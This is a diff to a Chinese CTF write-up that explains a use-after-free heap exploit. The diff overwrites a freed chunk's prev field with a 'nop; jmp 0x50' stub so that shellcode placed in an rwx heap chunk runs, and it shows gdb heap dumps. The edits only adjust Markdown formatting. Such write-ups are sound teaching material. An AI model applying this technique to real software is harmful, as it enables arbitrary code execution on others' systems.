@@ -6,15 +6,17 @@ free的时候没有置空指针，show的时候会先判断此索引位置func_t
 
 只需要设法将一个索引堆块的prev改成
 
+```
 In [12]: print disasm('90eb4d00'.decode('hex'))
    0:   90                      nop  
    1:   eb 4d                   jmp    0x50  
+```
 
 并将shellcode写入+0x50的堆块中，就能执行（加壳的程序堆块设置的权限是rwx）
 
 ```
 gdb-peda$ heapinfo  
-(0x20)     fastbin[0]: 0x5621e1d04d00 --> 0x5621e1d04d70 --> `0x5621e1d04c50` --> 0x0  
+(0x20)     fastbin[0]: 0x5621e1d04d00 --> 0x5621e1d04d70 --> 0x5621e1d04c50 --> 0x0  
 (0x30)     fastbin[1]: 0x0  
 (0x40)     fastbin[2]: 0x0  
 (0x50)     fastbin[3]: 0x5621e1d04d20 --> 0x5621e1d04d90 --> 0x0  
@@ -32,7 +34,7 @@ addr                prev                size                 status             
 0x5621e1cf3000      0x0                 0x11c10              Used                None              None  
 0x5621e1d04c10      0x0                 0x20                 Used                None              None    
 0x5621e1d04c30      0x6                 0x20                 Used                None              None    
-`0x5621e1d04c50`      0xcccccc004deb90    0x20                 Freed                0x0              None  
+0x5621e1d04c50      0xcccccc004deb90    0x20                 Freed                0x0              None  
 0x5621e1d04c70      0x20                0x90                 Freed     0x7fbcd1d27b78    0x7fbcd1d27b78  
 0x5621e1d04d00      0x90                0x20                 Freed     0x5621e1d04d70              None  
 0x5621e1d04d20      0x10                0x50                 Freed     0x5621e1d04d90              None  
